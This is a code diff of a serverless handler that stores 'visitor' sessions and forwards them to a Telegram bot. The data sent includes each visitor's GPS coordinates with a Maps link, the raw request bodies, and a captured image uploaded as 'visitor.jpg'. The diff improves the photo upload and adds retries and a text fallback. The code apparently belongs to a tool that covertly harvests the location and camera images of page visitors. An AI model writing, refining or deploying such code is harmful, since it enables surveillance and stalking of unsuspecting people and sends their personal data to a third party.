@@ -17,7 +17,7 @@ export async function onRequestPost({ request, env }) {
 
     await env.VISITOR_KV.put(id, JSON.stringify(session));
 
-    // ✅ ALWAYS try telegram on final
+    // send only on final
     if (body.event === "final") {
       await safeTelegram(env, session);
     }
@@ -27,28 +27,28 @@ export async function onRequestPost({ request, env }) {
     });
 
   } catch (err) {
-    // ✅ SEND ERROR TO TELEGRAM
     await safeTelegram(env, {
       error: err.message,
       raw: JSON.stringify(body)
     });
 
-    return new Response(JSON.stringify({
-      error: err.message
-    }), {
+    return new Response(JSON.stringify({ error: err.message }), {
       status: 500,
       headers: { "Content-Type": "application/json" }
     });
   }
 }
 
+
+// =======================
+// TELEGRAM SAFE WRAPPER
+// =======================
 async function safeTelegram(env, s) {
   try {
     await sendTelegram(env, s);
   } catch (e) {
     console.log("Telegram failed (1st):", e);
 
-    // retry once
     try {
       await sendTelegram(env, s);
     } catch (e2) {
@@ -65,6 +65,10 @@ async function safeTelegram(env, s) {
   }
 }
 
+
+// =======================
+// TELEGRAM MAIN
+// =======================
 async function sendTelegram(env, s) {
   const map = s.lat && s.lng
     ? `https://maps.google.com/?q=${s.lat},${s.lng}`
@@ -91,33 +95,59 @@ Lng: ${s.lng || "-"}
 ${s.error ? `❌ <b>Error:</b> ${s.error}` : ""}
 `;
 
-  let response;
+  // IMAGE PATH
+  if (s.image && s.image.startsWith("data:image")) {
 
-  if (s.image && s.image.length < 500000) {
-    response = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
+    // avoid oversized payload
+    if (s.image.length > 700000) {
+      console.log("Image too large → fallback to text");
+      return await sendText(env, text);
+    }
+
+    const res = await fetch(s.image);
+    const blob = await res.blob();
+
+    const form = new FormData();
+    form.append("chat_id", env.CHAT_ID);
+    form.append("photo", blob, "visitor.jpg");
+    form.append("caption", text);
+    form.append("parse_mode", "HTML");
+
+    const tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
       method: "POST",
-      body: new URLSearchParams({
-        chat_id: env.CHAT_ID,
-        photo: s.image,
-        caption: text,
-        parse_mode: "HTML"
-      })
+      body: form
     });
+
+    const result = await tg.json();
+
+    if (!result.ok) {
+      throw new Error("Telegram photo error: " + JSON.stringify(result));
+    }
+
   } else {
-    response = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      body: new URLSearchParams({
-        chat_id: env.CHAT_ID,
-        text: text,
-        parse_mode: "HTML"
-      })
-    });
+    return await sendText(env, text);
   }
+}
 
-  const result = await response.json();
 
-  // ❗ CRITICAL: check telegram success
+// =======================
+// TEXT FALLBACK
+// =======================
+async function sendText(env, text) {
+  const tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    body: new URLSearchParams({
+      chat_id: env.CHAT_ID,
+      text: text,
+      parse_mode: "HTML"
+    })
+  });
+
+  const result = await tg.json();
+
   if (!result.ok) {
-    throw new Error("Telegram API error: " + JSON.stringify(result));
+    throw new Error("Telegram text error: " + JSON.stringify(result));
   }
+
+  return result;
 }
